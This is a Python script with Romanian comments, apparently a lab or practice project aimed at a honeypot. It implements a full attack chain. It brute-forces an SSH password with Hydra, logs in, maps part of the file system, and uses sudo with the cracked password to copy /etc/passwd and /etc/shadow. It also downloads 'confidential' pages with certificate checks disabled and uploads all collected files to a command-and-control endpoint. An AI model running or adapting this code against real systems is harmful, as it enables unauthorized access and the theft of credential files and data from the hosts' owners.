#!/usr/bin/env python3
import subprocess
import re
import paramiko
import requests
import os
import time

HONEYPOT_HOST = "0.0.0.0"
HONEYPOT_USER = "honeypotproxy"
REMOTE_FILES = ["/etc/passwd", "/etc/shadow"]
C2_URL = "https://0.0.0.0:5000/upload"

# Lista de URL-uri pe care malware-ul le descarcă automat.
# Poți suprascrie această listă printr-un fișier local: /home/malware/url_list.txt
URLS_FILE = "/home/malware/proiect-practica/malware/url_list.txt"
URL_LIST = [
    f"http://{HONEYPOT_HOST}/secret/confidential.txt",
    f"https://{HONEYPOT_HOST}/secret/confidential.txt",
]

# Path-uri către certificate
MITM_CA_PATH = "/usr/local/share/ca-certificates/mitmproxy-ca.crt"
C2SERVER_CA_PATH = "/usr/local/share/ca-certificates/c2server-ca.crt"

# folder unde salvăm paginile descărcate
DOWNLOAD_DIR = "downloaded_pages"


def run_hydra():
    """Rulează Hydra cu un fișier de parole și returnează parola găsită"""
    cmd = [
        "hydra",
        "-l", HONEYPOT_USER,
        "-P", "/home/malware/proiect-practica/malware/passwords.txt",
        "-t", "4",
        "-f",
        HONEYPOT_HOST,
        "ssh"
    ]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = proc.stdout + proc.stderr
        match = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", output)
        if match:
            print(f"[+] Parola găsită de Hydra: {match.group(2)}")
            return match.group(2)
        else:
            print("[-] Nu s-a găsit parola în output-ul Hydra.")
            return None
    except subprocess.CalledProcessError as e:
        print(f"[-] Eroare la rularea Hydra: {e}")
        return None


def explore(ssh, path="/", depth=0, max_depth=2, file=None):
    if depth > max_depth:
        return
    try:
        stdin, stdout, stderr = ssh.exec_command(f"ls -1 {path}")
        items = stdout.read().decode().splitlines()
    except Exception as e:
        if file:
            file.write("  " * depth + f"[!] Eroare la listarea {path}: {e}\n")
        else:
            print("  " * depth + f"[!] Eroare la listarea {path}: {e}")
        return

    for item in items:
        full_path = path.rstrip("/") + "/" + item
        line = "  " * depth + "|-- " + item + "\n"
        if file:
            file.write(line)
        else:
            print(line, end="")
        stdin, stdout, stderr = ssh.exec_command(f'test -d "{full_path}" && echo DIR || echo FILE')
        typ = stdout.read().decode().strip()
        if typ == "DIR":
            explore(ssh, full_path, depth + 1, max_depth, file=file)


def get_files_from_honeypot(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HONEYPOT_HOST, username=HONEYPOT_USER, password=password)

    # Explorare folder
    with open("filesystem_map.txt", "w") as f:
        f.write(f"Explorare zone selectate din sistemul de fișiere pentru {HONEYPOT_HOST}:\n")
        for folder in ["/var/log"]:
            f.write(f"\nFolder: {folder}\n")
            explore(ssh, folder, 0, 1, file=f)
    print(f"[+] Structura sistemului de fișiere a fost salvată în filesystem_map.txt")

     # Descărcare fișiere
    for remote_file in REMOTE_FILES:
        local_file = os.path.basename(remote_file)
        try:
            # Rulează comanda cu sudo și trimite parola
            stdin, stdout, stderr = ssh.exec_command(f"sudo -S cat {remote_file}")
            stdin.write(f"{password}\n")
            stdin.flush()

            content = stdout.read().decode()
            with open(local_file, "w") as f:
                f.write(content)

            print(f"[+] Fișierul a fost descărcat local: {local_file}")
        except Exception as e:
            print(f"[-] Eroare la descărcarea {remote_file}: {e}")

    ssh.close()


def download_urls(urls, dest_dir=DOWNLOAD_DIR):
    os.makedirs(dest_dir, exist_ok=True)
    session = requests.Session()
    # dacă disponibilă, folosește CA-local (mitmproxy) — altfel ignoră verificarea
    if os.path.exists(MITM_CA_PATH):
        verify_opt = MITM_CA_PATH
    else:
        verify_opt = False

    downloaded = []
    for url in urls:
        try:
            r = session.get(url, timeout=20, verify=verify_opt)
            local_name = re.sub(r"[^0-9A-Za-z._-]", "_", url)
            local_path = os.path.join(dest_dir, local_name)
            with open(local_path, "wb") as fh:
                fh.write(r.content)
            downloaded.append(local_path)
            print(f"[+] Downloaded {url} -> {local_path}")
        except Exception as e:
            print(f"[-] Failed to download {url}: {e}")
    return downloaded


def upload_to_c2(extra_files=None):
    files_to_send = []
    for remote_file in REMOTE_FILES:
        local_file = os.path.basename(remote_file)
        if os.path.exists(local_file):
            files_to_send.append(local_file)

    if extra_files:
        for p in extra_files:
            if os.path.exists(p):
                files_to_send.append(p)

    for local_file in files_to_send:
        with open(local_file, "rb") as f:
            files = {"file": (os.path.basename(local_file), f)}
            try:
                # dacă folosești self-signed CA pentru c2server pe traseu, poți alege verify=False
                if os.path.exists(C2SERVER_CA_PATH):
                    verify_opt = C2SERVER_CA_PATH
                else:
                    verify_opt = False
                response = requests.post(C2_URL, files=files, verify=verify_opt, timeout=20)
                if response.status_code == 200:
                    print(f"[+] Fișierul {local_file} trimis cu succes la C2")
                else:
                    print(f"[-] Eroare la upload {local_file}: {response.status_code} {response.text}")
            except Exception as e:
                print(f"[-] Eroare la conectarea la C2 pentru {local_file}: {e}")


if __name__ == "__main__":
    # încarcă lista de URL-uri (dacă există) sau folosește URL_LIST default
    urls = URL_LIST
    if os.path.exists(URLS_FILE):
        try:
            with open(URLS_FILE, "r") as f:
                urls = [l.strip() for l in f if l.strip()]
            print(f"[+] Loaded {len(urls)} URLs from {URLS_FILE}")
        except Exception as e:
            print(f"[-] Could not read {URLS_FILE}: {e}")

    passwd = run_hydra()
    if passwd:
        get_files_from_honeypot(passwd)
        # descarcă paginile din listă
        downloaded = download_urls(urls)
        # urcă fișierele colectate + paginile descărcate
        upload_to_c2(extra_files=downloaded)
    else:
        print("[-] Nu am parola, nu pot continua.")
